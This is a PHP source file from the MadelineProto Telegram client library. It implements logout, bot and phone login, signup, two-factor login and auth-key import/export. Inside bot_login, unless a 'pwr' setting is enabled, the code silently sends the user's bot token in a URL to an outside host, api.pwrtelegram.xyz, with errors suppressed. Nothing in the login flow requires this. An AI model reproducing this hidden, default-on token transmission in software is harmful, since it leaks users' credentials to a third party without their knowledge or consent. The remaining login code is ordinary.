<?php

/*
Copyright 2016-2018 Daniil Gentili
(https://daniil.it)
This file is part of MadelineProto.
MadelineProto is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
MadelineProto is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU Affero General Public License for more details.
You should have received a copy of the GNU General Public License along with MadelineProto.
If not, see <http://www.gnu.org/licenses/>.
*/

namespace danog\MadelineProto\Wrappers;

/**
 * Manages logging in and out.
 */
trait Login
{
    public function logout()
    {
        foreach ($this->datacenter->sockets as $socket) {
            $socket->authorized = false;
        }
        $this->authorized = self::NOT_LOGGED_IN;
        $this->authorized_dc = -1;
        $this->authorization = null;
        $this->updates = [];
        $this->secret_chats = [];
        $this->chats = [];
        $this->users = [];
        $this->state = [];
        if (!$this->method_call('auth.logOut', [], ['datacenter' => $this->datacenter->curdc])) {
            throw new \danog\MadelineProto\Exception(\danog\MadelineProto\Lang::$current_lang['logout_error']);
        }
        \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['logout_ok'], \danog\MadelineProto\Logger::NOTICE);

        return true;
    }

    public function bot_login($token)
    {
        if ($this->authorized === self::LOGGED_IN) {
            \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['already_logged_in'], \danog\MadelineProto\Logger::NOTICE);
            $this->logout();
        }
        \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['login_bot'], \danog\MadelineProto\Logger::NOTICE);
        $this->authorization = $this->method_call('auth.importBotAuthorization', ['bot_auth_token' => $token, 'api_id' => $this->settings['app_info']['api_id'], 'api_hash' => $this->settings['app_info']['api_hash']], ['datacenter' => $this->datacenter->curdc]);
        $this->authorized = self::LOGGED_IN;
        $this->authorized_dc = $this->datacenter->curdc;
        $this->datacenter->sockets[$this->datacenter->curdc]->authorized = true;
        $this->updates = [];
        $this->updates_key = 0;
        if (!isset($this->settings['pwr']['pwr']) || !$this->settings['pwr']['pwr']) {
            @file_get_contents('https://api.pwrtelegram.xyz/bot'.$token.'/getme');
        }
        $this->init_authorization();
        \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['login_ok'], \danog\MadelineProto\Logger::NOTICE);

        return $this->authorization;
    }

    public function phone_login($number, $sms_type = 5)
    {
        if ($this->authorized === self::LOGGED_IN) {
            \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['already_logged_in'], \danog\MadelineProto\Logger::NOTICE);
            $this->logout();
        }
        \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['login_code_sending'], \danog\MadelineProto\Logger::NOTICE);
        $this->authorization = $this->method_call('auth.sendCode', ['phone_number' => $number, 'sms_type' => $sms_type, 'api_id' => $this->settings['app_info']['api_id'], 'api_hash' => $this->settings['app_info']['api_hash'], 'lang_code' => $this->settings['app_info']['lang_code']], ['datacenter' => $this->datacenter->curdc]);
        $this->authorized_dc = $this->datacenter->curdc;
        $this->authorization['phone_number'] = $number;
        //$this->authorization['_'] .= 'MP';
        $this->authorized = self::WAITING_CODE;
        $this->updates = [];
        $this->updates_key = 0;
        \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['login_code_sent'], \danog\MadelineProto\Logger::NOTICE);

        return $this->authorization;
    }

    public function complete_phone_login($code)
    {
        if ($this->authorized !== self::WAITING_CODE) {
            throw new \danog\MadelineProto\Exception(\danog\MadelineProto\Lang::$current_lang['login_code_uncalled']);
        }
        $this->authorized = self::NOT_LOGGED_IN;
        \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['login_user'], \danog\MadelineProto\Logger::NOTICE);

        try {
            $authorization = $this->method_call('auth.signIn', ['phone_number' => $this->authorization['phone_number'], 'phone_code_hash' => $this->authorization['phone_code_hash'], 'phone_code' => (string) $code], ['datacenter' => $this->datacenter->curdc]);
        } catch (\danog\MadelineProto\RPCErrorException $e) {
            if ($e->rpc === 'SESSION_PASSWORD_NEEDED') {
                \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['login_2fa_enabled'], \danog\MadelineProto\Logger::NOTICE);
                $this->authorized = self::WAITING_PASSWORD;
                $this->authorization = $this->method_call('account.getPassword', [], ['datacenter' => $this->datacenter->curdc]);

                return $this->authorization;
            }
            if ($e->rpc === 'PHONE_NUMBER_UNOCCUPIED') {
                \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['login_need_signup'], \danog\MadelineProto\Logger::NOTICE);
                $this->authorized = self::WAITING_SIGNUP;
                $this->authorization['phone_code'] = $code;

                return ['_' => 'account.needSignup'];
            }

            throw $e;
        }
        $this->authorized = self::LOGGED_IN;
        $this->authorization = $authorization;
        $this->datacenter->sockets[$this->datacenter->curdc]->authorized = true;
        $this->init_authorization();
        \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['login_ok'], \danog\MadelineProto\Logger::NOTICE);

        return $this->authorization;
    }

    public function import_authorization($authorization)
    {
        if ($this->authorized === self::LOGGED_IN) {
            \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['already_logged_in'], \danog\MadelineProto\Logger::NOTICE);
            $this->logout();
        }
        \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['login_auth_key'], \danog\MadelineProto\Logger::NOTICE);
        list($dc_id, $auth_key) = $authorization;
        if (!is_array($auth_key)) {
            $auth_key = ['auth_key' => $auth_key, 'id' => substr(sha1($auth_key, true), -8), 'server_salt' => ''];
        }
        $this->authorized_dc = $dc_id;
        $this->datacenter->sockets[$dc_id]->session_id = $this->random(8);
        $this->datacenter->sockets[$dc_id]->session_in_seq_no = 0;
        $this->datacenter->sockets[$dc_id]->session_out_seq_no = 0;
        $this->datacenter->sockets[$dc_id]->auth_key = $auth_key;
        $this->datacenter->sockets[$dc_id]->temp_auth_key = null;
        $this->datacenter->sockets[$dc_id]->incoming_messages = [];
        $this->datacenter->sockets[$dc_id]->outgoing_messages = [];
        $this->datacenter->sockets[$dc_id]->new_outgoing = [];
        $this->datacenter->sockets[$dc_id]->new_incoming = [];
        $this->datacenter->sockets[$dc_id]->authorized = true;
        $this->authorized = self::LOGGED_IN;
        $this->init_authorization();

        return $this->get_self();
    }

    public function export_authorization()
    {
        if ($this->authorized !== self::LOGGED_IN) {
            throw new \danog\MadelineProto\Exception(\danog\MadelineProto\Lang::$current_lang['not_logged_in']);
        }
        $this->get_self();
        $this->authorized_dc = $this->datacenter->curdc;

        return [$this->datacenter->curdc, $this->datacenter->sockets[$this->datacenter->curdc]->auth_key['auth_key']];
    }

    public function complete_signup($first_name, $last_name)
    {
        if ($this->authorized !== self::WAITING_SIGNUP) {
            throw new \danog\MadelineProto\Exception(\danog\MadelineProto\Lang::$current_lang['signup_uncalled']);
        }
        $this->authorized = self::NOT_LOGGED_IN;
        \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['signing_up'], \danog\MadelineProto\Logger::NOTICE);
        $this->authorization = $this->method_call('auth.signUp', ['phone_number' => $this->authorization['phone_number'], 'phone_code_hash' => $this->authorization['phone_code_hash'], 'phone_code' => $this->authorization['phone_code'], 'first_name' => $first_name, 'last_name' => $last_name], ['datacenter' => $this->datacenter->curdc]);
        $this->authorized = self::LOGGED_IN;
        $this->datacenter->sockets[$this->datacenter->curdc]->authorized = true;
        $this->init_authorization();
        \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['signup_ok'], \danog\MadelineProto\Logger::NOTICE);

        return $this->authorization;
    }

    public function complete_2fa_login($password)
    {
        if ($this->authorized !== self::WAITING_PASSWORD) {
            throw new \danog\MadelineProto\Exception(\danog\MadelineProto\Lang::$current_lang['2fa_uncalled']);
        }
        $this->authorized = self::NOT_LOGGED_IN;
        \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['login_user'], \danog\MadelineProto\Logger::NOTICE);
        $this->authorization = $this->method_call('auth.checkPassword', ['password_hash' => hash('sha256', $this->authorization['current_salt'].$password.$this->authorization['current_salt'], true)], ['datacenter' => $this->datacenter->curdc]);
        $this->authorized = self::LOGGED_IN;
        $this->datacenter->sockets[$this->datacenter->curdc]->authorized = true;
        $this->init_authorization();
        \danog\MadelineProto\Logger::log(\danog\MadelineProto\Lang::$current_lang['login_ok'], \danog\MadelineProto\Logger::NOTICE);

        return $this->authorization;
    }
}
